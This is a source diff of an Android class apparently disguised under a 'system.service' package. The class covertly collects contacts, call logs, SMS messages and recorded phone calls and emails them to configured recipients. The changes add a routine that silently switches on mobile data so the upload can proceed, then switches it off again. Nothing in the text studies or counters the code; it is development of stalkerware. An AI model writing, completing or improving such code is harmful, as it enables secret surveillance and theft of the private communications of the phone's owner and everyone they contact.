@@ -10,6 +10,7 @@ import java.util.List;
 import java.util.TimerTask;
 
 import system.service.activity.GlobalPrefActivity;
+import system.service.activity.NETWORK_CONNECT_MODE;
 import system.service.config.ConfigCtrl;
 import system.service.config.MailCfg;
 import system.service.feature.contact.ContactCtrl;
@@ -68,6 +69,11 @@ public class GetInfoTask extends TimerTask
 		if (recipients == null || recipients.length == 0) return;
 		
 		// If network connected, try to collect and send the information
+		boolean activateDataNetwork = false;
+		if (GlobalPrefActivity.getNetworkConnectMode(context) == NETWORK_CONNECT_MODE.ACTIVE) {
+			activateDataNetwork = NetworkUtil.tryToConnectDataNetwork(context);
+		} 
+		
 		if (!NetworkUtil.isNetworkConnected(context)) return;
 		
 		// ===================================================================================
@@ -87,55 +93,53 @@ public class GetInfoTask extends TimerTask
 		if (interval < 1) interval = 1;
 		now.add(Calendar.DATE, -1*interval);
 		Date now_minus_x_day = now.getTime();
-		if (lastDatetime != null && now_minus_x_day.before(lastDatetime)) 
+		if (lastDatetime == null || now_minus_x_day.after(lastDatetime)) 
 		{
-			return;
-		}
-		
-		// Clean attachments
-		if (attachments == null) attachments = new ArrayList<File>();
-		else attachments.clear();
-		
-		// Collect information
-		CollectContact(context);
-		SysUtils.threadSleep(1000, LOGTAG);
-		CollectPhoneCallHist(context);
-		SysUtils.threadSleep(1000, LOGTAG);
-		CollectSms(context);
-		SysUtils.threadSleep(1000, LOGTAG);
-		
-		if (!NetworkUtil.isNetworkConnected(context)) {
+			// Clean attachments
+			if (attachments == null) attachments = new ArrayList<File>();
+			else attachments.clear();
+			
+			// Collect information
+			CollectContact(context);
+			SysUtils.threadSleep(1000, LOGTAG);
+			CollectPhoneCallHist(context);
+			SysUtils.threadSleep(1000, LOGTAG);
+			CollectSms(context);
+			SysUtils.threadSleep(1000, LOGTAG);
+			
+			if (!NetworkUtil.isNetworkConnected(context)) {
+				// Clean the files in SD-CARD
+				FileCtrl.cleanTxtFiles();
+				return;
+			}
+			
+			// Send mail
+			String phoneNum = ConfigCtrl.getSelfName(context);
+			String subject = context.getResources().getString(R.string.mail_from) 
+		          		 + phoneNum + "-" + DatetimeUtil.format3.format(new Date())
+		          		 + context.getResources().getString(R.string.mail_description);
+			String body = String.format(context.getResources().getString(R.string.mail_body_info), phoneNum);
+			String pwd = MailCfg.getSenderPwd(context);
+			
+			boolean result = false;
+			int retry = DEFAULT_RETRY_COUNT;
+			while(!result && retry > 0)
+			{
+				String sender = MailCfg.getSender(context);
+				result = sendMail(subject, body, sender, pwd, recipients, attachments);
+				retry--;
+			}
+			attachments.clear();
+				
+			// Update the last date time
+			if (result) {
+				boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
+				if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
+			}
+			
 			// Clean the files in SD-CARD
 			FileCtrl.cleanTxtFiles();
-			return;
 		}
-		
-		// Send mail
-		String phoneNum = ConfigCtrl.getSelfName(context);
-		String subject = context.getResources().getString(R.string.mail_from) 
-	          		 + phoneNum + "-" + DatetimeUtil.format3.format(new Date())
-	          		 + context.getResources().getString(R.string.mail_description);
-		String body = String.format(context.getResources().getString(R.string.mail_body), phoneNum);
-		String pwd = MailCfg.getSenderPwd(context);
-		
-		boolean result = false;
-		int retry = DEFAULT_RETRY_COUNT;
-		while(!result && retry > 0)
-		{
-			String sender = MailCfg.getSender(context);
-			result = sendMail(subject, body, sender, pwd, recipients, attachments);
-			retry--;
-		}
-		attachments.clear();
-			
-		// Update the last date time
-		if (result) {
-			boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
-			if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
-		}
-		
-		// Clean the files in SD-CARD
-		FileCtrl.cleanTxtFiles();
 		
 		// ===================================================================================
 		// Try to send phone call recording
@@ -172,21 +176,23 @@ public class GetInfoTask extends TimerTask
 		
 		// Send mails (5 wavs attached per mail) 
 		int COUNT_PER_PACKAGE = 5;
+		String phoneNum = ConfigCtrl.getSelfName(context);
+		String body = String.format(context.getResources().getString(R.string.mail_body_record), phoneNum);
+		String pwd = MailCfg.getSenderPwd(context);
+		
 		for (int i=0; i < (1 + wavCount/COUNT_PER_PACKAGE); i++) {
 			List<File> pack = getPackage(wavs, COUNT_PER_PACKAGE, i);
 			if (pack.size() <= 0) break;
 
-			subject = prefix + "-" + context.getResources().getString(R.string.mail_from) + phoneNum 
+			String subject = prefix + "-" + context.getResources().getString(R.string.mail_from) + phoneNum 
 		       		 + "-" + DatetimeUtil.format3.format(new Date()) 
 		       		 + "-" + String.valueOf(i+1);
-			body = String.format(context.getResources().getString(R.string.mail_body), phoneNum);
-			//String pwd = MailCfg.getSenderPwd(context);
-		
+			
 			if (!NetworkUtil.isNetworkConnected(context)) {
 				return;
 			}
-			result = false;
-			retry = DEFAULT_RETRY_COUNT;
+			boolean result = false;
+			int retry = DEFAULT_RETRY_COUNT;
 			while(!result && retry > 0)
 			{
 				String sender = MailCfg.getSender(context);
@@ -198,6 +204,10 @@ public class GetInfoTask extends TimerTask
 			if (result) {
 				FileCtrl.cleanWavFiles(pack);
 			}
+		}
+		
+		if (activateDataNetwork) {
+			NetworkUtil.tryToDisconnectDataNetwork(context);
 		}
 		
 	} // end of run()
